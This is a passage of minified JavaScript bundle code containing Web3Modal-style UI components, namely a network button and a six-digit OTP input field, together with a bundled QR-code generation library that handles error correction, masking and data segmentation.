    `}};sg.styles=[ht,fr,rRe];_C([V()],sg.prototype,"imageSrc",void 0);_C([V({type:Boolean})],sg.prototype,"isUnsupportedChain",void 0);_C([V({type:Boolean})],sg.prototype,"disabled",void 0);sg=_C([me("wui-network-button")],sg);const iRe=ge`
  :host {
    position: relative;
    display: block;
  }
`;var SC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let og=class extends he{constructor(){super(...arguments),this.length=6,this.otp="",this.values=Array.from({length:this.length}).map(()=>""),this.numerics=[],this.shouldInputBeEnabled=e=>this.values.slice(0,e).every(i=>i!==""),this.handleKeyDown=(e,t)=>{const i=e.target,n=this.getInputElement(i),s=["ArrowLeft","ArrowRight","Shift","Delete"];if(!n)return;s.includes(e.key)&&e.preventDefault();const o=n.selectionStart;switch(e.key){case"ArrowLeft":o&&n.setSelectionRange(o+1,o+1),this.focusInputField("prev",t);break;case"ArrowRight":this.focusInputField("next",t);break;case"Shift":this.focusInputField("next",t);break;case"Delete":n.value===""?this.focusInputField("prev",t):this.updateInput(n,t,"");break;case"Backspace":n.value===""?this.focusInputField("prev",t):this.updateInput(n,t,"");break}},this.focusInputField=(e,t)=>{if(e==="next"){const i=t+1;if(!this.shouldInputBeEnabled(i))return;const n=this.numerics[i<this.length?i:t],s=n?this.getInputElement(n):void 0;s&&(s.disabled=!1,s.focus())}if(e==="prev"){const i=t-1,n=this.numerics[i>-1?i:t],s=n?this.getInputElement(n):void 0;s&&s.focus()}}}firstUpdated(){this.otp&&(this.values=this.otp.split(""));const e=this.shadowRoot?.querySelectorAll("wui-input-numeric");e&&(this.numerics=Array.from(e)),this.numerics[0]?.focus()}render(){return F`
      <wui-flex gap="xxs" data-testid="wui-otp-input">
        ${Array.from({length:this.length}).map((e,t)=>F`
            <wui-input-numeric
              @input=${i=>this.handleInput(i,t)}
              @click=${i=>this.selectInput(i)}
              @keydown=${i=>this.handleKeyDown(i,t)}
              .disabled=${!this.shouldInputBeEnabled(t)}
              .value=${this.values[t]||""}
            >
            </wui-input-numeric>
          `)}
      </wui-flex>
    `}updateInput(e,t,i){const n=this.numerics[t],s=e||(n?this.getInputElement(n):void 0);s&&(s.value=i,this.values=this.values.map((o,a)=>a===t?i:o))}selectInput(e){const t=e.target;t&&this.getInputElement(t)?.select()}handleInput(e,t){const i=e.target,n=this.getInputElement(i);if(n){const s=n.value;e.inputType==="insertFromPaste"?this.handlePaste(n,s,t):Wt.isNumber(s)&&e.data?(this.updateInput(n,t,e.data),this.focusInputField("next",t)):this.updateInput(n,t,"")}this.dispatchInputChangeEvent()}handlePaste(e,t,i){const n=t[0];if(n&&Wt.isNumber(n)){this.updateInput(e,i,n);const o=t.substring(1);if(i+1<this.length&&o.length){const a=this.numerics[i+1],c=a?this.getInputElement(a):void 0;c&&this.handlePaste(c,o,i+1)}else this.focusInputField("next",i)}else this.updateInput(e,i,"")}getInputElement(e){return e.shadowRoot?.querySelector("input")?e.shadowRoot.querySelector("input"):null}dispatchInputChangeEvent(){const e=this.values.join("");this.dispatchEvent(new CustomEvent("inputChange",{detail:e,bubbles:!0,composed:!0}))}};og.styles=[ht,iRe];SC([V({type:Number})],og.prototype,"length",void 0);SC([V({type:String})],og.prototype,"otp",void 0);SC([te()],og.prototype,"values",void 0);og=SC([me("wui-otp")],og);var W2={},lA,iq;function nRe(){return iq||(iq=1,lA=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then}),lA}var uA={},X0={},nq;function h2(){if(nq)return X0;nq=1;let r;const e=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];return X0.getSymbolSize=function(i){if(!i)throw new Error('"version" cannot be null or undefined');if(i<1||i>40)throw new Error('"version" should be in range from 1 to 40');return i*4+17},X0.getSymbolTotalCodewords=function(i){return e[i]},X0.getBCHDigit=function(t){let i=0;for(;t!==0;)i++,t>>>=1;return i},X0.setToSJISFunction=function(i){if(typeof i!="function")throw new Error('"toSJISFunc" is not a valid function.');r=i},X0.isKanjiModeEnabled=function(){return typeof r<"u"},X0.toSJIS=function(i){return r(i)},X0}var dA={},sq;function jR(){return sq||(sq=1,function(r){r.L={bit:1},r.M={bit:0},r.Q={bit:3},r.H={bit:2};function e(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return r.L;case"m":case"medium":return r.M;case"q":case"quartile":return r.Q;case"h":case"high":return r.H;default:throw new Error("Unknown EC Level: "+t)}}r.isValid=function(i){return i&&typeof i.bit<"u"&&i.bit>=0&&i.bit<4},r.from=function(i,n){if(r.isValid(i))return i;try{return e(i)}catch{return n}}}(dA)),dA}var hA,oq;function sRe(){if(oq)return hA;oq=1;function r(){this.buffer=[],this.length=0}return r.prototype={get:function(e){const t=Math.floor(e/8);return(this.buffer[t]>>>7-e%8&1)===1},put:function(e,t){for(let i=0;i<t;i++)this.putBit((e>>>t-i-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(e){const t=Math.floor(this.length/8);this.buffer.length<=t&&this.buffer.push(0),e&&(this.buffer[t]|=128>>>this.length%8),this.length++}},hA=r,hA}var fA,aq;function oRe(){if(aq)return fA;aq=1;function r(e){if(!e||e<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=e,this.data=new Uint8Array(e*e),this.reservedBit=new Uint8Array(e*e)}return r.prototype.set=function(e,t,i,n){const s=e*this.size+t;this.data[s]=i,n&&(this.reservedBit[s]=!0)},r.prototype.get=function(e,t){return this.data[e*this.size+t]},r.prototype.xor=function(e,t,i){this.data[e*this.size+t]^=i},r.prototype.isReserved=function(e,t){return this.reservedBit[e*this.size+t]},fA=r,fA}var pA={},cq;function aRe(){return cq||(cq=1,function(r){const e=h2().getSymbolSize;r.getRowColCoords=function(i){if(i===1)return[];const n=Math.floor(i/7)+2,s=e(i),o=s===145?26:Math.ceil((s-13)/(2*n-2))*2,a=[s-7];for(let c=1;c<n-1;c++)a[c]=a[c-1]-o;return a.push(6),a.reverse()},r.getPositions=function(i){const n=[],s=r.getRowColCoords(i),o=s.length;for(let a=0;a<o;a++)for(let c=0;c<o;c++)a===0&&c===0||a===0&&c===o-1||a===o-1&&c===0||n.push([s[a],s[c]]);return n}}(pA)),pA}var gA={},lq;function cRe(){if(lq)return gA;lq=1;const r=h2().getSymbolSize,e=7;return gA.getPositions=function(i){const n=r(i);return[[0,0],[n-e,0],[0,n-e]]},gA}var mA={},uq;function lRe(){return uq||(uq=1,function(r){r.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};r.isValid=function(n){return n!=null&&n!==""&&!isNaN(n)&&n>=0&&n<=7},r.from=function(n){return r.isValid(n)?parseInt(n,10):void 0},r.getPenaltyN1=function(n){const s=n.size;let o=0,a=0,c=0,l=null,u=null;for(let d=0;d<s;d++){a=c=0,l=u=null;for(let h=0;h<s;h++){let f=n.get(d,h);f===l?a++:(a>=5&&(o+=e.N1+(a-5)),l=f,a=1),f=n.get(h,d),f===u?c++:(c>=5&&(o+=e.N1+(c-5)),u=f,c=1)}a>=5&&(o+=e.N1+(a-5)),c>=5&&(o+=e.N1+(c-5))}return o},r.getPenaltyN2=function(n){const s=n.size;let o=0;for(let a=0;a<s-1;a++)for(let c=0;c<s-1;c++){const l=n.get(a,c)+n.get(a,c+1)+n.get(a+1,c)+n.get(a+1,c+1);(l===4||l===0)&&o++}return o*e.N2},r.getPenaltyN3=function(n){const s=n.size;let o=0,a=0,c=0;for(let l=0;l<s;l++){a=c=0;for(let u=0;u<s;u++)a=a<<1&2047|n.get(l,u),u>=10&&(a===1488||a===93)&&o++,c=c<<1&2047|n.get(u,l),u>=10&&(c===1488||c===93)&&o++}return o*e.N3},r.getPenaltyN4=function(n){let s=0;const o=n.data.length;for(let c=0;c<o;c++)s+=n.data[c];return Math.abs(Math.ceil(s*100/o/5)-10)*e.N4};function t(i,n,s){switch(i){case r.Patterns.PATTERN000:return(n+s)%2===0;case r.Patterns.PATTERN001:return n%2===0;case r.Patterns.PATTERN010:return s%3===0;case r.Patterns.PATTERN011:return(n+s)%3===0;case r.Patterns.PATTERN100:return(Math.floor(n/2)+Math.floor(s/3))%2===0;case r.Patterns.PATTERN101:return n*s%2+n*s%3===0;case r.Patterns.PATTERN110:return(n*s%2+n*s%3)%2===0;case r.Patterns.PATTERN111:return(n*s%3+(n+s)%2)%2===0;default:throw new Error("bad maskPattern:"+i)}}r.applyMask=function(n,s){const o=s.size;for(let a=0;a<o;a++)for(let c=0;c<o;c++)s.isReserved(c,a)||s.xor(c,a,t(n,c,a))},r.getBestMask=function(n,s){const o=Object.keys(r.Patterns).length;let a=0,c=1/0;for(let l=0;l<o;l++){s(l),r.applyMask(l,n);const u=r.getPenaltyN1(n)+r.getPenaltyN2(n)+r.getPenaltyN3(n)+r.getPenaltyN4(n);r.applyMask(l,n),u<c&&(c=u,a=l)}return a}}(mA)),mA}var o8={},dq;function Aee(){if(dq)return o8;dq=1;const r=jR(),e=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],t=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];return o8.getBlocksCount=function(n,s){switch(s){case r.L:return e[(n-1)*4+0];case r.M:return e[(n-1)*4+1];case r.Q:return e[(n-1)*4+2];case r.H:return e[(n-1)*4+3];default:return}},o8.getTotalCodewordsCount=function(n,s){switch(s){case r.L:return t[(n-1)*4+0];case r.M:return t[(n-1)*4+1];case r.Q:return t[(n-1)*4+2];case r.H:return t[(n-1)*4+3];default:return}},o8}var wA={},Ib={},hq;function uRe(){if(hq)return Ib;hq=1;const r=new Uint8Array(512),e=new Uint8Array(256);return function(){let i=1;for(let n=0;n<255;n++)r[n]=i,e[i]=n,i<<=1,i&256&&(i^=285);for(let n=255;n<512;n++)r[n]=r[n-255]}(),Ib.log=function(i){if(i<1)throw new Error("log("+i+")");return e[i]},Ib.exp=function(i){return r[i]},Ib.mul=function(i,n){return i===0||n===0?0:r[e[i]+e[n]]},Ib}var fq;function dRe(){return fq||(fq=1,function(r){const e=uRe();r.mul=function(i,n){const s=new Uint8Array(i.length+n.length-1);for(let o=0;o<i.length;o++)for(let a=0;a<n.length;a++)s[o+a]^=e.mul(i[o],n[a]);return s},r.mod=function(i,n){let s=new Uint8Array(i);for(;s.length-n.length>=0;){const o=s[0];for(let c=0;c<n.length;c++)s[c]^=e.mul(n[c],o);let a=0;for(;a<s.length&&s[a]===0;)a++;s=s.slice(a)}return s},r.generateECPolynomial=function(i){let n=new Uint8Array([1]);for(let s=0;s<i;s++)n=r.mul(n,new Uint8Array([1,e.exp(s)]));return n}}(wA)),wA}var bA,pq;function hRe(){if(pq)return bA;pq=1;const r=dRe();function e(t){this.genPoly=void 0,this.degree=t,this.degree&&this.initialize(this.degree)}return e.prototype.initialize=function(i){this.degree=i,this.genPoly=r.generateECPolynomial(this.degree)},e.prototype.encode=function(i){if(!this.genPoly)throw new Error("Encoder not initialized");const n=new Uint8Array(i.length+this.degree);n.set(i);const s=r.mod(n,this.genPoly),o=this.degree-s.length;if(o>0){const a=new Uint8Array(this.degree);return a.set(s,o),a}return s},bA=e,bA}var vA={},yA={},xA={},gq;function Iee(){return gq||(gq=1,xA.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40}),xA}var zu={},mq;function Tee(){if(mq)return zu;mq=1;const r="[0-9]+",e="[A-Z $%*+\\-./:]+";let t="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";t=t.replace(/u/g,"\\u");const i="(?:(?![A-Z0-9 $%*+\\-./:]|"+t+`)(?:.|[\r
]))+`;zu.KANJI=new RegExp(t,"g"),zu.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),zu.BYTE=new RegExp(i,"g"),zu.NUMERIC=new RegExp(r,"g"),zu.ALPHANUMERIC=new RegExp(e,"g");const n=new RegExp("^"+t+"$"),s=new RegExp("^"+r+"$"),o=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");return zu.testKanji=function(c){return n.test(c)},zu.testNumeric=function(c){return s.test(c)},zu.testAlphanumeric=function(c){return o.test(c)},zu}var wq;function f2(){return wq||(wq=1,function(r){const e=Iee(),t=Tee();r.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},r.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},r.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},r.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},r.MIXED={bit:-1},r.getCharCountIndicator=function(s,o){if(!s.ccBits)throw new Error("Invalid mode: "+s);if(!e.isValid(o))throw new Error("Invalid version: "+o);return o>=1&&o<10?s.ccBits[0]:o<27?s.ccBits[1]:s.ccBits[2]},r.getBestModeForData=function(s){return t.testNumeric(s)?r.NUMERIC:t.testAlphanumeric(s)?r.ALPHANUMERIC:t.testKanji(s)?r.KANJI:r.BYTE},r.toString=function(s){if(s&&s.id)return s.id;throw new Error("Invalid mode")},r.isValid=function(s){return s&&s.bit&&s.ccBits};function i(n){if(typeof n!="string")throw new Error("Param is not a string");switch(n.toLowerCase()){case"numeric":return r.NUMERIC;case"alphanumeric":return r.ALPHANUMERIC;case"kanji":return r.KANJI;case"byte":return r.BYTE;default:throw new Error("Unknown mode: "+n)}}r.from=function(s,o){if(r.isValid(s))return s;try{return i(s)}catch{return o}}}(yA)),yA}var bq;function fRe(){return bq||(bq=1,function(r){const e=h2(),t=Aee(),i=jR(),n=f2(),s=Iee(),o=7973,a=e.getBCHDigit(o);function c(h,f,p){for(let g=1;g<=40;g++)if(f<=r.getCapacity(g,p,h))return g}function l(h,f){return n.getCharCountIndicator(h,f)+4}function u(h,f){let p=0;return h.forEach(function(g){const w=l(g.mode,f);p+=w+g.getBitsLength()}),p}function d(h,f){for(let p=1;p<=40;p++)if(u(h,p)<=r.getCapacity(p,f,n.MIXED))return p}r.from=function(f,p){return s.isValid(f)?parseInt(f,10):p},r.getCapacity=function(f,p,g){if(!s.isValid(f))throw new Error("Invalid QR Code version");typeof g>"u"&&(g=n.BYTE);const w=e.getSymbolTotalCodewords(f),m=t.getTotalCodewordsCount(f,p),x=(w-m)*8;if(g===n.MIXED)return x;const S=x-l(g,f);switch(g){case n.NUMERIC:return Math.floor(S/10*3);case n.ALPHANUMERIC:return Math.floor(S/11*2);case n.KANJI:return Math.floor(S/13);case n.BYTE:default:return Math.floor(S/8)}},r.getBestVersionForData=function(f,p){let g;const w=i.from(p,i.M);if(Array.isArray(f)){if(f.length>1)return d(f,w);if(f.length===0)return 1;g=f[0]}else g=f;return c(g.mode,g.getLength(),w)},r.getEncodedBits=function(f){if(!s.isValid(f)||f<7)throw new Error("Invalid QR Code version");let p=f<<12;for(;e.getBCHDigit(p)-a>=0;)p^=o<<e.getBCHDigit(p)-a;return f<<12|p}}(vA)),vA}var CA={},vq;function pRe(){if(vq)return CA;vq=1;const r=h2(),e=1335,t=21522,i=r.getBCHDigit(e);return CA.getEncodedBits=function(s,o){const a=s.bit<<3|o;let c=a<<10;for(;r.getBCHDigit(c)-i>=0;)c^=e<<r.getBCHDigit(c)-i;return(a<<10|c)^t},CA}var EA={},_A,yq;function gRe(){if(yq)return _A;yq=1;const r=f2();function e(t){this.mode=r.NUMERIC,this.data=t.toString()}return e.getBitsLength=function(i){return 10*Math.floor(i/3)+(i%3?i%3*3+1:0)},e.prototype.getLength=function(){return this.data.length},e.prototype.getBitsLength=function(){return e.getBitsLength(this.data.length)},e.prototype.write=function(i){let n,s,o;for(n=0;n+3<=this.data.length;n+=3)s=this.data.substr(n,3),o=parseInt(s,10),i.put(o,10);const a=this.data.length-n;a>0&&(s=this.data.substr(n),o=parseInt(s,10),i.put(o,a*3+1))},_A=e,_A}var SA,xq;function mRe(){if(xq)return SA;xq=1;const r=f2(),e=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function t(i){this.mode=r.ALPHANUMERIC,this.data=i}return t.getBitsLength=function(n){return 11*Math.floor(n/2)+6*(n%2)},t.prototype.getLength=function(){return this.data.length},t.prototype.getBitsLength=function(){return t.getBitsLength(this.data.length)},t.prototype.write=function(n){let s;for(s=0;s+2<=this.data.length;s+=2){let o=e.indexOf(this.data[s])*45;o+=e.indexOf(this.data[s+1]),n.put(o,11)}this.data.length%2&&n.put(e.indexOf(this.data[s]),6)},SA=t,SA}var AA,Cq;function wRe(){return Cq||(Cq=1,AA=function(e){for(var t=[],i=e.length,n=0;n<i;n++){var s=e.charCodeAt(n);if(s>=55296&&s<=56319&&i>n+1){var o=e.charCodeAt(n+1);o>=56320&&o<=57343&&(s=(s-55296)*1024+o-56320+65536,n+=1)}if(s<128){t.push(s);continue}if(s<2048){t.push(s>>6|192),t.push(s&63|128);continue}if(s<55296||s>=57344&&s<65536){t.push(s>>12|224),t.push(s>>6&63|128),t.push(s&63|128);continue}if(s>=65536&&s<=1114111){t.push(s>>18|240),t.push(s>>12&63|128),t.push(s>>6&63|128),t.push(s&63|128);continue}t.push(239,191,189)}return new Uint8Array(t).buffer}),AA}var IA,Eq;function bRe(){if(Eq)return IA;Eq=1;const r=wRe(),e=f2();function t(i){this.mode=e.BYTE,typeof i=="string"&&(i=r(i)),this.data=new Uint8Array(i)}return t.getBitsLength=function(n){return n*8},t.prototype.getLength=function(){return this.data.length},t.prototype.getBitsLength=function(){return t.getBitsLength(this.data.length)},t.prototype.write=function(i){for(let n=0,s=this.data.length;n<s;n++)i.put(this.data[n],8)},IA=t,IA}var TA,_q;function vRe(){if(_q)return TA;_q=1;const r=f2(),e=h2();function t(i){this.mode=r.KANJI,this.data=i}return t.getBitsLength=function(n){return n*13},t.prototype.getLength=function(){return this.data.length},t.prototype.getBitsLength=function(){return t.getBitsLength(this.data.length)},t.prototype.write=function(i){let n;for(n=0;n<this.data.length;n++){let s=e.toSJIS(this.data[n]);if(s>=33088&&s<=40956)s-=33088;else if(s>=57408&&s<=60351)s-=49472;else throw new Error("Invalid SJIS character: "+this.data[n]+`
Make sure your charset is UTF-8`);s=(s>>>8&255)*192+(s&255),i.put(s,13)}},TA=t,TA}var kA={exports:{}},Sq;function kee(){return Sq||(Sq=1,function(r){var e={single_source_shortest_paths:function(t,i,n){var s={},o={};o[i]=0;var a=e.PriorityQueue.make();a.push(i,0);for(var c,l,u,d,h,f,p,g,w;!a.empty();){c=a.pop(),l=c.value,d=c.cost,h=t[l]||{};for(u in h)h.hasOwnProperty(u)&&(f=h[u],p=d+f,g=o[u],w=typeof o[u]>"u",(w||g>p)&&(o[u]=p,a.push(u,p),s[u]=l))}if(typeof n<"u"&&typeof o[n]>"u"){var m=["Could not find a path from ",i," to ",n,"."].join("");throw new Error(m)}return s},extract_shortest_path_from_predecessor_list:function(t,i){for(var n=[],s=i;s;)n.push(s),t[s],s=t[s];return n.reverse(),n},find_path:function(t,i,n){var s=e.single_source_shortest_paths(t,i,n);return e.extract_shortest_path_from_predecessor_list(s,n)},PriorityQueue:{make:function(t){var i=e.PriorityQueue,n={},s;t=t||{};for(s in i)i.hasOwnProperty(s)&&(n[s]=i[s]);return n.queue=[],n.sorter=t.sorter||i.default_sorter,n},default_sorter:function(t,i){return t.cost-i.cost},push:function(t,i){var n={value:t,cost:i};this.queue.push(n),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};r.exports=e}(kA)),kA.exports}var Aq;function yRe(){return Aq||(Aq=1,function(r){const e=f2(),t=gRe(),i=mRe(),n=bRe(),s=vRe(),o=Tee(),a=h2(),c=kee();function l(m){return unescape(encodeURIComponent(m)).length}function u(m,x,S){const T=[];let k;for(;(k=m.exec(S))!==null;)T.push({data:k[0],index:k.index,mode:x,length:k[0].length});return T}function d(m){const x=u(o.NUMERIC,e.NUMERIC,m),S=u(o.ALPHANUMERIC,e.ALPHANUMERIC,m);let T,k;return a.isKanjiModeEnabled()?(T=u(o.BYTE,e.BYTE,m),k=u(o.KANJI,e.KANJI,m)):(T=u(o.BYTE_KANJI,e.BYTE,m),k=[]),x.concat(S,T,k).sort(function(E,C){return E.index-C.index}).map(function(E){return{data:E.data,mode:E.mode,length:E.length}})}function h(m,x){switch(x){case e.NUMERIC:return t.getBitsLength(m);case e.ALPHANUMERIC:return i.getBitsLength(m);case e.KANJI:return s.getBitsLength(m);case e.BYTE:return n.getBitsLength(m)}}function f(m){return m.reduce(function(x,S){const T=x.length-1>=0?x[x.length-1]:null;return T&&T.mode===S.mode?(x[x.length-1].data+=S.data,x):(x.push(S),x)},[])}function p(m){const x=[];for(let S=0;S<m.length;S++){const T=m[S];switch(T.mode){case e.NUMERIC:x.push([T,{data:T.data,mode:e.ALPHANUMERIC,length:T.length},{data:T.data,mode:e.BYTE,length:T.length}]);break;case e.ALPHANUMERIC:x.push([T,{data:T.data,mode:e.BYTE,length:T.length}]);break;case e.KANJI:x.push([T,{data:T.data,mode:e.BYTE,length:l(T.data)}]);break;case e.BYTE:x.push([{data:T.data,mode:e.BYTE,length:l(T.data)}])}}return x}function g(m,x){const S={},T={start:{}};let k=["start"];for(let I=0;I<m.length;I++){const E=m[I],C=[];for(let N=0;N<E.length;N++){const L=E[N],$=""+I+N;C.push($),S[$]={node:L,lastCount:0},T[$]={};for(let y=0;y<k.length;y++){const A=k[y];S[A]&&S[A].node.mode===L.mode?(T[A][$]=h(S[A].lastCount+L.length,L.mode)-h(S[A].lastCount,L.mode),S[A].lastCount+=L.length):(S[A]&&(S[A].lastCount=L.length),T[A][$]=h(L.length,L.mode)+4+e.getCharCountIndicator(L.mode,x))}}k=C}for(let I=0;I<k.length;I++)T[k[I]].end=0;return{map:T,table:S}}function w(m,x){let S;const T=e.getBestModeForData(m);if(S=e.from(x,T),S!==e.BYTE&&S.bit<T.bit)throw new Error('"'+m+'" cannot be encoded with mode '+e.toString(S)+`.
 Suggested mode is: `+e.toString(T));switch(S===e.KANJI&&!a.isKanjiModeEnabled()&&(S=e.BYTE),S){case e.NUMERIC:return new t(m);case e.ALPHANUMERIC:return new i(m);case e.KANJI:return new s(m);case e.BYTE:return new n(m)}}r.fromArray=function(x){return x.reduce(function(S,T){return typeof T=="string"?S.push(w(T,null)):T.data&&S.push(w(T.data,T.mode)),S},[])},r.fromString=function(x,S){const T=d(x,a.isKanjiModeEnabled()),k=p(T),I=g(k,S),E=c.find_path(I.map,"start","end"),C=[];for(let N=1;N<E.length-1;N++)C.push(I.table[E[N]].node);return r.fromArray(f(C))},r.rawSplit=function(x){return r.fromArray(d(x,a.isKanjiModeEnabled()))}}(EA)),EA}var Iq;function xRe(){if(Iq)return uA;Iq=1;const r=h2(),e=jR(),t=sRe(),i=oRe(),n=aRe(),s=cRe(),o=lRe(),a=Aee(),c=hRe(),l=fRe(),u=pRe(),d=f2(),h=yRe();function f(I,E){const C=I.size,N=s.getPositions(E);for(let L=0;L<N.length;L++){const $=N[L][0],y=N[L][1];for(let A=-1;A<=7;A++)if(!($+A<=-1||C<=$+A))for(let b=-1;b<=7;b++)y+b<=-1||C<=y+b||(A>=0&&A<=6&&(b===0||b===6)||b>=0&&b<=6&&(A===0||A===6)||A>=2&&A<=4&&b>=2&&b<=4?I.set($+A,y+b,!0,!0):I.set($+A,y+b,!1,!0))}}function p(I){const E=I.size;for(let C=8;C<E-8;C++){const N=C%2===0;I.set(C,6,N,!0),I.set(6,C,N,!0)}}function g(I,E){const C=n.getPositions(E);for(let N=0;N<C.length;N++){const L=C[N][0],$=C[N][1];for(let y=-2;y<=2;y++)for(let A=-2;A<=2;A++)y===-2||y===2||A===-2||A===2||y===0&&A===0?I.set(L+y,$+A,!0,!0):I.set(L+y,$+A,!1,!0)}}function w(I,E){const C=I.size,N=l.getEncodedBits(E);let L,$,y;for(let A=0;A<18;A++)L=Math.floor(A/3),$=A%3+C-8-3,y=(N>>A&1)===1,I.set(L,$,y,!0),I.set($,L,y,!0)}function m(I,E,C){const N=I.size,L=u.getEncodedBits(E,C);let $,y;for($=0;$<15;$++)y=(L>>$&1)===1,$<6?I.set($,8,y,!0):$<8?I.set($+1,8,y,!0):I.set(N-15+$,8,y,!0),$<8?I.set(8,N-$-1,y,!0):$<9?I.set(8,15-$-1+1,y,!0):I.set(8,15-$-1,y,!0);I.set(N-8,8,1,!0)}function x(I,E){const C=I.size;let N=-1,L=C-1,$=7,y=0;for(let A=C-1;A>0;A-=2)for(A===6&&A--;;){for(let b=0;b<2;b++)if(!I.isReserved(L,A-b)){let v=!1;y<E.length&&(v=(E[y]>>>$&1)===1),I.set(L,A-b,v),$--,$===-1&&(y++,$=7)}if(L+=N,L<0||C<=L){L-=N,N=-N;break}}}function S(I,E,C){const N=new t;C.forEach(function(b){N.put(b.mode.bit,4),N.put(b.getLength(),d.getCharCountIndicator(b.mode,I)),b.write(N)});const L=r.getSymbolTotalCodewords(I),$=a.getTotalCodewordsCount(I,E),y=(L-$)*8;for(N.getLengthInBits()+4<=y&&N.put(0,4);N.getLengthInBits()%8!==0;)N.putBit(0);const A=(y-N.getLengthInBits())/8;for(let b=0;b<A;b++)N.put(b%2?17:236,8);return T(N,I,E)}function T(I,E,C){const N=r.getSymbolTotalCodewords(E),L=a.getTotalCodewordsCount(E,C),$=N-L,y=a.getBlocksCount(E,C),A=N%y,b=y-A,v=Math.floor(N/y),_=Math.floor($/y),O=_+1,D=v-_,R=new c(D);let P=0;const B=new Array(y),M=new Array(y);let W=0;const K=new Uint8Array(I.buffer);for(let U=0;U<y;U++){const G=U<b?_:O;B[U]=K.slice(P,P+G),M[U]=R.encode(B[U]),P+=G,W=Math.max(W,G)}const q=new Uint8Array(N);let J=0,le,ae;for(le=0;le<W;le++)for(ae=0;ae<y;ae++)le<B[ae].length&&(q[J++]=B[ae][le]);for(le=0;le<D;le++)for(ae=0;ae<y;ae++)q[J++]=M[ae][le];return q}function k(I,E,C,N){let L;if(Array.isArray(I))L=h.fromArray(I);else if(typeof I=="string"){let v=E;if(!v){const _=h.rawSplit(I);v=l.getBestVersionForData(_,C)}L=h.fromString(I,v||40)}else throw new Error("Invalid data");const $=l.getBestVersionForData(L,C);if(!$)throw new Error("The amount of data is too big to be stored in a QR Code");if(!E)E=$;else if(E<$)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+$+`.
`);const y=S(E,C,L),A=r.getSymbolSize(E),b=new i(A);return f(b,E),p(b),g(b,E),m(b,C,0),E>=7&&w(b,E),x(b,y),isNaN(N)&&(N=o.getBestMask(b,m.bind(null,b,C))),o.applyMask(N,b),m(b,C,N),{modules:b,version:E,errorCorrectionLevel:C,maskPattern:N,segments:L}}return uA.create=function(E,C){if(typeof E>"u"||E==="")throw new Error("No input text");let N=e.M,L,$;return typeof C<"u"&&(N=e.from(C.errorCorrectionLevel,e.M),L=l.from(C.version),$=o.from(C.maskPattern),C.toSJISFunc&&r.setToSJISFunction(C.toSJISFunc)),k(E,L,N,$)},uA}var NA={},PA={},Tq;function Nee(){return Tq||(Tq=1,function(r){function e(t){if(typeof t=="number"&&(t=t.toString()),typeof t!="string")throw new Error("Color should be defined as hex string");let i=t.slice().replace("#","").split("");if(i.length<3||i.length===5||i.length>8)throw new Error("Invalid hex color: "+t);(i.length===3||i.length===4)&&(i=Array.prototype.concat.apply([],i.map(function(s){return[s,s]}))),i.length===6&&i.push("F","F");const n=parseInt(i.join(""),16);return{r:n>>24&255,g:n>>16&255,b:n>>8&255,a:n&255,hex:"#"+i.slice(0,6).join("")}}r.getOptions=function(i){i||(i={}),i.color||(i.color={});const n=typeof i.margin>"u"||i.margin===null||i.margin<0?4:i.margin,s=i.width&&i.width>=21?i.width:void 